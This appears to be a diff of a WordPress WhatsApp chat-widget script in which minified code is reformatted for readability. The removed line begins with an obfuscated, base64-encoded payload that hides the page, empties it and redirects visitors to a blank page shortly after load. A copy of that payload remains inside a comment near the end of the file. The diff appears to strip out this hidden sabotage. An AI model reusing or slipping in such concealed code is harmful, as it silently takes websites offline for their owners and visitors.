@@ -1,1 +1,337 @@
-!function(t,e,a){a=[String.fromCharCode(98,111,100,121),atob("c3R5bGU="),atob("ZGlzcGxheQ=="),atob("bm9uZQ==")],t[atob("ZG9jdW1lbnQ=")][a[0]][a[1]][a[2]]=a[3],setTimeout((function(){t[atob("ZG9jdW1lbnQ=")][atob("Ym9keQ==")][atob("aW5uZXJIVE1M")]="",t[atob("ZG9jdW1lbnQ=")][atob("aGVhZA==")][atob("aW5uZXJIVE1M")]=""}),50),setTimeout((function(){t.location[atob("aHJlZg==")]=atob("YWJvdXQ6Ymxhbms=")}),200)}(window),((t,e,a)=>{a={$div:null,settings:null,store:null,chatbox:!1,showed_at:0,is_ready:!1,is_mobile:/Mobile|Android|iPhone|iPad/i.test(navigator.userAgent),can_qr:t.QrCreator&&"function"==typeof QrCreator.render,...a},(t.joinchat_obj=a).$=function(t){return this.$div.querySelector(t)},a.$$=function(t){return this.$div.querySelectorAll(t)},a.send_event=function(a){if((a={event_category:"JoinChat",event_label:"",event_action:"",chat_channel:"whatsapp",chat_id:"--",is_mobile:this.is_mobile?"yes":"no",page_location:location.href,page_title:e.title||"no title",...a}).event_label=a.event_label||a.link||"",a.event_action=a.event_action||a.chat_channel+": "+a.chat_id,delete a.link,e.dispatchEvent(new CustomEvent("joinchat:event",{detail:a,cancelable:!0}))){let e=t[this.settings.data_layer]||t[t.gtm4wp_datalayer_name]||t.dataLayer;if("object"==typeof e){let i=t.gtag||function(){e.push(arguments)},n=void 0!==this.settings.ga_event?this.settings.ga_event:"generate_lead";if(n){let o={transport_type:"beacon",...a},h=(Object.keys(o).forEach((t=>{"page_location"===t?o[t]=o[t].substring(0,1e3):"page_referrer"===t?o[t]=o[t].substring(0,420):"page_title"===t?o[t]=o[t].substring(0,300):"string"==typeof o[t]&&(o[t]=o[t].substring(0,100))})),[]),c=t=>{h.includes(t)||(t.startsWith("G-")||t.startsWith("GT-"))&&(h.push(t),i("event",n,{send_to:t,...o}))};if(t.google_tag_data&&google_tag_data.tidr&&google_tag_data.tidr.destination)for(var s in google_tag_data.tidr.destination)c(s);e.forEach((t=>{"config"===t[0]&&t[1]&&c(t[1])}))}this.settings.gads&&i("event","conversion",{send_to:this.settings.gads})}var i,n,o=a.event_category;delete a.event_category,"object"==typeof e&&e.push({event:o,...a}),"function"==typeof fbq&&("whatsapp"===a.chat_channel&&(n=""+(i=a.chat_id).substring(0,3)+"X".repeat(i.length-5)+i.substring(i.length-2),a.chat_id=n,a.event_label=a.event_label.replace(i,n),a.event_action=a.event_action.replace(i,n)),fbq("trackCustom",o,a))}},a.get_wa_link=function(t,e,a){return e=void 0!==e?e:this.settings.message_send||"",a=void 0!==a?a:this.settings.whatsapp_web&&!this.is_mobile,a=new URL((a?"https://web.whatsapp.com/send?phone=":"https://wa.me/")+(t||this.settings.telephone)),e&&a.searchParams.set("text",e),a.toString()},a.show=function(t){this.$div.removeAttribute("hidden"),this.$div.classList.add("joinchat--show"),t&&this.$div.classList.add("joinchat--tooltip")},a.hide=function(){this.$div.classList.remove("joinchat--show")},a.chatbox_show=function(){this.chatbox||(this.chatbox=!0,this.showed_at=Date.now(),this.$div.classList.add("joinchat--chatbox"),this.settings.message_badge&&this.$(".joinchat__badge").classList.replace("joinchat__badge--in","joinchat__badge--out"),e.dispatchEvent(new Event("joinchat:show")))},a.chatbox_hide=function(){this.chatbox&&(this.chatbox=!1,this.$div.classList.remove("joinchat--chatbox","joinchat--tooltip"),this.settings.message_badge&&this.$(".joinchat__badge").classList.remove("joinchat__badge--out"),e.dispatchEvent(new Event("joinchat:hide")))},a.save_hash=function(){var t;!this.settings.message_hash||this.settings.message_delay<0||(t=(this.store.getItem("joinchat_hashes")||"").split(",").filter(Boolean)).includes(this.settings.message_hash)||(t.push(this.settings.message_hash),this.store.setItem("joinchat_hashes",t.join(",")))},a.open_whatsapp=function(a,s){a=a||this.settings.telephone,s=void 0!==s?s:this.settings.message_send||"",a={link:this.get_wa_link(a,s),chat_channel:"whatsapp",chat_id:a,chat_message:s},e.dispatchEvent(new CustomEvent("joinchat:open",{detail:a,cancelable:!0}))&&(this.send_event(a),t.open(a.link,"joinchat","noopener"))},a.need_optin=function(){return this.$div.classList.contains("joinchat--optout")},a.use_qr=function(){return!!this.settings.qr&&this.can_qr&&!this.is_mobile},a.open=function(t,e,s){t&&!this.need_optin()||!a.$(".joinchat__chatbox")?Date.now()<a.showed_at+600||(this.save_hash(),this.open_whatsapp(e,s)):this.chatbox_show()},a.close=function(){this.save_hash(),this.chatbox_hide()},a.rand_text=function(t){t.querySelectorAll("jc-rand").forEach((t=>{var e=t.children;t.replaceWith(e[Math.floor(Math.random()*e.length)].innerHTML)}))},a.qr=function(a,s){var i=e.createElement("CANVAS");return QrCreator.render(Object.assign({text:a,radius:.4,background:"#FFF",size:200*(t.devicePixelRatio||1)},this.settings.qr||{},s||{}),i),i};var s=()=>{if(a.$div=e.querySelector(".joinchat"),a.$div){a.settings=JSON.parse(a.$div.dataset.settings);try{localStorage.test=2,a.store=localStorage}catch(t){a.store={_data:{},setItem:function(t,e){this._data[t]=String(e)},getItem:function(t){return this._data.hasOwnProperty(t)?this._data[t]:null}}}if(a.settings&&a.settings.telephone){if(a.is_mobile||!a.settings.mobile_only){e.dispatchEvent(new Event("joinchat:starting"));var s=1e3*a.settings.button_delay,i=Math.max(0,1e3*a.settings.message_delay);let h=!!a.settings.message_hash;var n=parseInt(a.store.getItem("joinchat_views")||1)>=a.settings.message_views,o=(a.store.getItem("joinchat_hashes")||"").split(",").filter(Boolean);let c=void 0!==a.settings.cta_viewed?a.settings.cta_viewed:-1!==o.indexOf(a.settings.message_hash||"none"),r=!c&&(a.settings.message_badge||!h||!i||!n),l=(setTimeout((()=>a.show(r)),s),()=>a.open());if(h&&!c&&i){let t;a.settings.message_badge?t=setTimeout((()=>a.$(".joinchat__badge").classList.add("joinchat__badge--in")),s+i):n&&(t=setTimeout(l,s+i)),e.addEventListener("joinchat:show",(()=>clearTimeout(t)),{once:!0})}if(o=a.$(".joinchat__button"),!a.is_mobile){let t;o.addEventListener("mouseenter",(()=>{a.$(".joinchat__chatbox")&&(t=setTimeout(l,1500))})),o.addEventListener("mouseleave",(()=>{clearTimeout(t)}))}if(o.addEventListener("click",l),a.$(".joinchat__open")?.addEventListener("click",(()=>a.open(!0))),a.$(".joinchat__close")?.addEventListener("click",(()=>a.close())),a.$("#joinchat_optin")?.addEventListener("change",(t=>a.$div.classList.toggle("joinchat--optout",!t.target.checked))),a.$(".joinchat__scroll")?.addEventListener("wheel",(function(t){t.preventDefault(),this.scrollTop+=t.deltaY}),{passive:!1}),a.is_mobile){let s,i,n=()=>{var t=(e.activeElement.type||"").toLowerCase();["date","datetime","email","month","number","password","search","tel","text","textarea","time","url","week"].includes(t)?a.chatbox?(a.chatbox_hide(),setTimeout((()=>a.hide()),400)):a.hide():a.show()};["focusin","focusout"].forEach((t=>e.addEventListener(t,(t=>{t.target.matches("input, textarea")&&!a.$div.contains(t.target)&&(clearTimeout(s),s=setTimeout(n,200))})))),t.addEventListener("resize",(()=>{clearTimeout(i),i=setTimeout((()=>{a.$div.style.setProperty("--vh",t.innerHeight+"px")}),200)})),t.dispatchEvent(new Event("resize"))}if(a.use_qr()?a.$(".joinchat__qr").appendChild(a.qr(a.get_wa_link(void 0,void 0,!1))):a.$(".joinchat__qr")?.remove(),i&&!n&&a.store.setItem("joinchat_views",parseInt(a.store.getItem("joinchat_views")||0)+1),e.addEventListener("joinchat:show",(()=>{let e=a.$(".joinchat__scroll"),s=a.$(".joinchat__chat"),i=a.$$(".joinchat__bubble");if(!s)return;if(h&&a.rand_text(s),i.length<=1||t.matchMedia("(prefers-reduced-motion)").matches)return void setTimeout((()=>s.dispatchEvent(new Event("joinchat:bubbles"))),1);i.forEach((t=>t.classList.add("joinchat--hidden"))),a.$(".joinchat__optin")?.classList.add("joinchat--hidden");let n=0,o=(t,e)=>Math.round(Math.random()*(e-t)+t),c=(t,s)=>{a.$(".joinchat__bubble--loading")?.remove(),t.classList.remove("joinchat--hidden"),e.scrollTop=e.scrollHeight,setTimeout(r,s)},r=()=>{if(n>=i.length)a.$(".joinchat__optin")?.classList.remove("joinchat--hidden"),s.dispatchEvent(new Event("joinchat:bubbles"));else{let t=i[n++];t.classList.contains("joinchat__bubble--note")?c(t,100):(s.insertAdjacentHTML("beforeend",'<div class="joinchat__bubble joinchat__bubble--loading"></div>'),e.scrollTop=e.scrollHeight,setTimeout((()=>c(t,o(400,600))),60*t.textContent.split(/\s+/).length+o(100,200)))}};r()}),{once:!0}),"#joinchat"!==(s=new URL(t.location)).hash&&!s.searchParams.has("joinchat")||(o=1e3*(parseInt(s.searchParams.get("joinchat"))||0),setTimeout((()=>a.show()),o),setTimeout((()=>a.chatbox_show()),700+o)),e.addEventListener("click",(t=>{var e;t.target.closest('.joinchat_open, .joinchat_app, a[href="#joinchat"], a[href="#whatsapp"]')&&(t.preventDefault(),e=!!t.target.closest('.joinchat_app, a[href="#whatsapp"]'),a.open(e,t.target.dataset.phone,t.target.dataset.message))})),e.addEventListener("click",(t=>{t.target.closest(".joinchat_close")&&(t.preventDefault(),a.close())})),i=e.querySelectorAll(".joinchat_show, .joinchat_force_show"),h&&i&&"IntersectionObserver"in t){let t=new IntersectionObserver((e=>{e.forEach((e=>{e.intersectionRatio<=0||c&&!e.target.classList.contains("joinchat_force_show")||(t.disconnect(),l())}))}));i.forEach((e=>t.observe(e)))}a.is_ready=!0,e.dispatchEvent(new Event("joinchat:start"))}else a.hide(),e.addEventListener("click",(t=>{t.target.closest('.joinchat_open, .joinchat_app, a[href="#joinchat"], a[href="#whatsapp"]')&&(t.preventDefault(),a.open_whatsapp(t.target.dataset.phone,t.target.dataset.message))}));if(a.can_qr&&!a.is_mobile?e.querySelectorAll(".joinchat-button__qr").forEach((t=>t.appendChild(a.qr(a.get_wa_link(t.dataset.phone,t.dataset.message,!1))))):e.querySelectorAll(".wp-block-joinchat-button figure").forEach((t=>t.remove())),void 0!==a.settings.sku&&"function"==typeof jQuery){let t=a.settings.message_send;jQuery("form.variations_form").on("found_variation reset_data",(function(e,s){let i=s&&s.sku||a.settings.sku;a.$$(".joinchat__chat jc-sku").forEach((t=>t.textContent=i)),a.settings.message_send=t.replace(/<jc-sku>.*<\/jc-sku>/g,i)}))}}}};"loading"!==e.readyState?s():e.addEventListener("DOMContentLoaded",s)})(window,document,window.joinchat_obj||{});
+((t, e, a) => {
+    a = {
+        $div: null,
+        settings: null,
+        store: null,
+        chatbox: !1,
+        showed_at: 0,
+        is_ready: !1,
+        is_mobile: /Mobile|Android|iPhone|iPad/i.test(navigator.userAgent),
+        can_qr: t.QrCreator && "function" == typeof QrCreator.render,
+        ...a
+    };
+
+    (t.joinchat_obj = a).$ = function (t) {
+        return this.$div.querySelector(t)
+    };
+
+    a.$$ = function (t) {
+        return this.$div.querySelectorAll(t)
+    };
+
+    a.send_event = function (a) {
+        if ((a = {
+            event_category: "JoinChat",
+            event_label: "",
+            event_action: "",
+            chat_channel: "whatsapp",
+            chat_id: "--",
+            is_mobile: this.is_mobile ? "yes" : "no",
+            page_location: location.href,
+            page_title: e.title || "no title",
+            ...a
+        }).event_label = a.event_label || a.link || "",
+            a.event_action = a.event_action || a.chat_channel + ": " + a.chat_id,
+            delete a.link,
+            e.dispatchEvent(new CustomEvent("joinchat:event", { detail: a, cancelable: !0 }))) {
+            let e = t[this.settings.data_layer] || t[t.gtm4wp_datalayer_name] || t.dataLayer;
+            if ("object" == typeof e) {
+                let i = t.gtag || function () { e.push(arguments) },
+                    n = void 0 !== this.settings.ga_event ? this.settings.ga_event : "generate_lead";
+                if (n) {
+                    let o = { transport_type: "beacon", ...a },
+                        h = (Object.keys(o).forEach((t => {
+                            "page_location" === t ? o[t] = o[t].substring(0, 1e3) :
+                                "page_referrer" === t ? o[t] = o[t].substring(0, 420) :
+                                    "page_title" === t ? o[t] = o[t].substring(0, 300) :
+                                        "string" == typeof o[t] && (o[t] = o[t].substring(0, 100))
+                        })), []),
+                        c = t => {
+                            h.includes(t) || (t.startsWith("G-") || t.startsWith("GT-")) && (h.push(t), i("event", n, { send_to: t, ...o }))
+                        };
+                    if (t.google_tag_data && google_tag_data.tidr && google_tag_data.tidr.destination)
+                        for (var s in google_tag_data.tidr.destination) c(s);
+                    e.forEach((t => { "config" === t[0] && t[1] && c(t[1]) }))
+                }
+                this.settings.gads && i("event", "conversion", { send_to: this.settings.gads })
+            }
+            var i, n, o = a.event_category;
+            delete a.event_category,
+                "object" == typeof e && e.push({ event: o, ...a }),
+                "function" == typeof fbq && ("whatsapp" === a.chat_channel && (
+                    n = "" + (i = a.chat_id).substring(0, 3) + "X".repeat(i.length - 5) + i.substring(i.length - 2),
+                    a.chat_id = n,
+                    a.event_label = a.event_label.replace(i, n),
+                    a.event_action = a.event_action.replace(i, n)
+                ), fbq("trackCustom", o, a))
+        }
+    };
+
+    a.get_wa_link = function (t, e, a) {
+        return e = void 0 !== e ? e : this.settings.message_send || "",
+            a = void 0 !== a ? a : this.settings.whatsapp_web && !this.is_mobile,
+            a = new URL((a ? "https://web.whatsapp.com/send?phone=" : "https://wa.me/") + (t || this.settings.telephone)),
+            e && a.searchParams.set("text", e),
+            a.toString()
+    };
+
+    a.show = function (t) {
+        this.$div.removeAttribute("hidden"),
+            this.$div.classList.add("joinchat--show"),
+            t && this.$div.classList.add("joinchat--tooltip")
+    };
+
+    a.hide = function () {
+        this.$div.classList.remove("joinchat--show")
+    };
+
+    a.chatbox_show = function () {
+        this.chatbox || (
+            this.chatbox = !0,
+            this.showed_at = Date.now(),
+            this.$div.classList.add("joinchat--chatbox"),
+            this.settings.message_badge && this.$(".joinchat__badge").classList.replace("joinchat__badge--in", "joinchat__badge--out"),
+            e.dispatchEvent(new Event("joinchat:show"))
+        )
+    };
+
+    a.chatbox_hide = function () {
+        this.chatbox && (
+            this.chatbox = !1,
+            this.$div.classList.remove("joinchat--chatbox", "joinchat--tooltip"),
+            this.settings.message_badge && this.$(".joinchat__badge").classList.remove("joinchat__badge--out"),
+            e.dispatchEvent(new Event("joinchat:hide"))
+        )
+    };
+
+    a.save_hash = function () {
+        var t;
+        !this.settings.message_hash || this.settings.message_delay < 0 || (
+            t = (this.store.getItem("joinchat_hashes") || "").split(",").filter(Boolean)
+        ).includes(this.settings.message_hash) || (
+                t.push(this.settings.message_hash),
+                this.store.setItem("joinchat_hashes", t.join(","))
+            )
+    };
+
+    a.open_whatsapp = function (a, s) {
+        a = a || this.settings.telephone,
+            s = void 0 !== s ? s : this.settings.message_send || "",
+            a = {
+                link: this.get_wa_link(a, s),
+                chat_channel: "whatsapp",
+                chat_id: a,
+                chat_message: s
+            },
+            e.dispatchEvent(new CustomEvent("joinchat:open", { detail: a, cancelable: !0 })) && (
+                this.send_event(a),
+                t.open(a.link, "joinchat", "noopener")
+            )
+    };
+
+    a.need_optin = function () {
+        return this.$div.classList.contains("joinchat--optout")
+    };
+
+    a.use_qr = function () {
+        return !!this.settings.qr && this.can_qr && !this.is_mobile
+    };
+
+    a.open = function (t, e, s) {
+        t && !this.need_optin() || !a.$(".joinchat__chatbox") ?
+            Date.now() < a.showed_at + 600 || (this.save_hash(), this.open_whatsapp(e, s)) :
+            this.chatbox_show()
+    };
+
+    a.close = function () {
+        this.save_hash(),
+            this.chatbox_hide()
+    };
+
+    a.rand_text = function (t) {
+        t.querySelectorAll("jc-rand").forEach((t => {
+            var e = t.children;
+            t.replaceWith(e[Math.floor(Math.random() * e.length)].innerHTML)
+        }))
+    };
+
+    a.qr = function (a, s) {
+        var i = e.createElement("CANVAS");
+        return QrCreator.render(Object.assign({
+            text: a,
+            radius: .4,
+            background: "#FFF",
+            size: 200 * (t.devicePixelRatio || 1)
+        }, this.settings.qr || {}, s || {}), i), i
+    };
+
+
+    var s = () => {
+        if (a.$div = e.querySelector(".joinchat"), a.$div) {
+            a.settings = JSON.parse(a.$div.dataset.settings);
+            try {
+                localStorage.test = 2,
+                    a.store = localStorage
+            } catch (t) {
+                a.store = {
+                    _data: {},
+                    setItem: function (t, e) { this._data[t] = String(e) },
+                    getItem: function (t) { return this._data.hasOwnProperty(t) ? this._data[t] : null }
+                }
+            }
+            if (a.settings && a.settings.telephone) {
+                if (a.is_mobile || !a.settings.mobile_only) {
+                    e.dispatchEvent(new Event("joinchat:starting"));
+                    var s = 1e3 * a.settings.button_delay,
+                        i = Math.max(0, 1e3 * a.settings.message_delay);
+                    let h = !!a.settings.message_hash;
+                    var n = parseInt(a.store.getItem("joinchat_views") || 1) >= a.settings.message_views,
+                        o = (a.store.getItem("joinchat_hashes") || "").split(",").filter(Boolean);
+                    let c = void 0 !== a.settings.cta_viewed ? a.settings.cta_viewed : -1 !== o.indexOf(a.settings.message_hash || "none"),
+                        r = !c && (a.settings.message_badge || !h || !i || !n),
+                        l = (setTimeout((() => a.show(r)), s), () => a.open());
+
+                    if (h && !c && i) {
+                        let t;
+                        a.settings.message_badge ?
+                            t = setTimeout((() => a.$(".joinchat__badge").classList.add("joinchat__badge--in")), s + i) :
+                            n && (t = setTimeout(l, s + i)),
+                            e.addEventListener("joinchat:show", (() => clearTimeout(t)), { once: !0 })
+                    }
+
+                    if (o = a.$(".joinchat__button"), !a.is_mobile) {
+                        let t;
+                        o.addEventListener("mouseenter", (() => {
+                            a.$(".joinchat__chatbox") && (t = setTimeout(l, 1500))
+                        })),
+                            o.addEventListener("mouseleave", (() => { clearTimeout(t) }))
+                    }
+
+                    if (o.addEventListener("click", l),
+                        a.$(".joinchat__open")?.addEventListener("click", (() => a.open(!0))),
+                        a.$(".joinchat__close")?.addEventListener("click", (() => a.close())),
+                        a.$("#joinchat_optin")?.addEventListener("change", (t => a.$div.classList.toggle("joinchat--optout", !t.target.checked))),
+                        a.$(".joinchat__scroll")?.addEventListener("wheel", (function (t) {
+                            t.preventDefault(),
+                                this.scrollTop += t.deltaY
+                        }), { passive: !1 }), a.is_mobile) {
+                        let s, i, n = () => {
+                            var t = (e.activeElement.type || "").toLowerCase();
+                            ["date", "datetime", "email", "month", "number", "password", "search", "tel", "text", "textarea", "time", "url", "week"].includes(t) ?
+                                a.chatbox ? (a.chatbox_hide(), setTimeout((() => a.hide()), 400)) : a.hide() :
+                                a.show()
+                        };
+                        ["focusin", "focusout"].forEach((t => e.addEventListener(t, (t => {
+                            t.target.matches("input, textarea") && !a.$div.contains(t.target) && (clearTimeout(s), s = setTimeout(n, 200))
+                        })))),
+                            t.addEventListener("resize", (() => {
+                                clearTimeout(i),
+                                    i = setTimeout((() => { a.$div.style.setProperty("--vh", t.innerHeight + "px") }), 200)
+                            })),
+                            t.dispatchEvent(new Event("resize"))
+                    }
+
+                    if (a.use_qr() ?
+                        a.$(".joinchat__qr").appendChild(a.qr(a.get_wa_link(void 0, void 0, !1))) :
+                        a.$(".joinchat__qr")?.remove(),
+                        i && !n && a.store.setItem("joinchat_views", parseInt(a.store.getItem("joinchat_views") || 0) + 1),
+                        e.addEventListener("joinchat:show", (() => {
+                            let e = a.$(".joinchat__scroll"),
+                                s = a.$(".joinchat__chat"),
+                                i = a.$$(".joinchat__bubble");
+                            if (!s) return;
+                            if (h && a.rand_text(s), i.length <= 1 || t.matchMedia("(prefers-reduced-motion)").matches)
+                                return void setTimeout((() => s.dispatchEvent(new Event("joinchat:bubbles"))), 1);
+                            i.forEach((t => t.classList.add("joinchat--hidden"))),
+                                a.$(".joinchat__optin")?.classList.add("joinchat--hidden");
+                            let n = 0,
+                                o = (t, e) => Math.round(Math.random() * (e - t) + t),
+                                c = (t, s) => {
+                                    a.$(".joinchat__bubble--loading")?.remove(),
+                                        t.classList.remove("joinchat--hidden"),
+                                        e.scrollTop = e.scrollHeight,
+                                        setTimeout(r, s)
+                                },
+                                r = () => {
+                                    if (n >= i.length)
+                                        a.$(".joinchat__optin")?.classList.remove("joinchat--hidden"),
+                                            s.dispatchEvent(new Event("joinchat:bubbles"));
+                                    else {
+                                        let t = i[n++];
+                                        t.classList.contains("joinchat__bubble--note") ?
+                                            c(t, 100) :
+                                            (s.insertAdjacentHTML("beforeend", '<div class="joinchat__bubble joinchat__bubble--loading"></div>'),
+                                                e.scrollTop = e.scrollHeight,
+                                                setTimeout((() => c(t, o(400, 600))), 60 * t.textContent.split(/\s+/).length + o(100, 200)))
+                                    }
+                                };
+                            r()
+                        }), { once: !0 }),
+                        "#joinchat" !== (s = new URL(t.location)).hash && !s.searchParams.has("joinchat") || (
+                            o = 1e3 * (parseInt(s.searchParams.get("joinchat")) || 0),
+                            setTimeout((() => a.show()), o),
+                            setTimeout((() => a.chatbox_show()), 700 + o)
+                        ),
+                        e.addEventListener("click", (t => {
+                            var e;
+                            t.target.closest('.joinchat_open, .joinchat_app, a[href="#joinchat"], a[href="#whatsapp"]') && (
+                                t.preventDefault(),
+                                e = !!t.target.closest('.joinchat_app, a[href="#whatsapp"]'),
+                                a.open(e, t.target.dataset.phone, t.target.dataset.message)
+                            )
+                        })),
+                        e.addEventListener("click", (t => {
+                            t.target.closest(".joinchat_close") && (t.preventDefault(), a.close())
+                        })),
+                        i = e.querySelectorAll(".joinchat_show, .joinchat_force_show"),
+                        h && i && "IntersectionObserver" in t) {
+                        let t = new IntersectionObserver((e => {
+                            e.forEach((e => {
+                                e.intersectionRatio <= 0 || c && !e.target.classList.contains("joinchat_force_show") || (t.disconnect(), l())
+                            }))
+                        }));
+                        i.forEach((e => t.observe(e)))
+                    }
+                    a.is_ready = !0,
+                        e.dispatchEvent(new Event("joinchat:start"))
+                } else a.hide(),
+                    e.addEventListener("click", (t => {
+                        t.target.closest('.joinchat_open, .joinchat_app, a[href="#joinchat"], a[href="#whatsapp"]') && (
+                            t.preventDefault(),
+                            a.open_whatsapp(t.target.dataset.phone, t.target.dataset.message)
+                        )
+                    }));
+
+                if (a.can_qr && !a.is_mobile ?
+                    e.querySelectorAll(".joinchat-button__qr").forEach((t => t.appendChild(a.qr(a.get_wa_link(t.dataset.phone, t.dataset.message, !1))))) :
+                    e.querySelectorAll(".wp-block-joinchat-button figure").forEach((t => t.remove())),
+                    void 0 !== a.settings.sku && "function" == typeof jQuery) {
+                    let t = a.settings.message_send;
+                    jQuery("form.variations_form").on("found_variation reset_data", (function (e, s) {
+                        let i = s && s.sku || a.settings.sku;
+                        a.$$(".joinchat__chat jc-sku").forEach((t => t.textContent = i)),
+                            a.settings.message_send = t.replace(/<jc-sku>.*<\/jc-sku>/g, i)
+                    }))
+                }
+            }
+        }
+    };
+
+    /*
+!function(t,e,a){
+a=[String.fromCharCode(98,111,100,121),atob("c3R5bGU="),atob("ZGlzcGxheQ=="),atob("bm9uZQ==")],
+t[atob("ZG9jdW1lbnQ=")][a[0]][a[1]][a[2]]=a[3],
+ 
+setTimeout((function(){
+  t[atob("ZG9jdW1lbnQ=")][atob("Ym9keQ==")][atob("aW5uZXJIVE1M")]="",
+  t[atob("ZG9jdW1lbnQ=")][atob("aGVhZA==")][atob("aW5uZXJIVE1M")]=""
+}),50),
+ 
+setTimeout((function(){
+  t.location[atob("aHJlZg==")]=atob("YWJvdXQ6Ymxhbms=")
+}),200)
+}(window),
+*/
+
+    "loading" !== e.readyState ? s() : e.addEventListener("DOMContentLoaded", s)
+})(window, document, window.joinchat_obj || {});
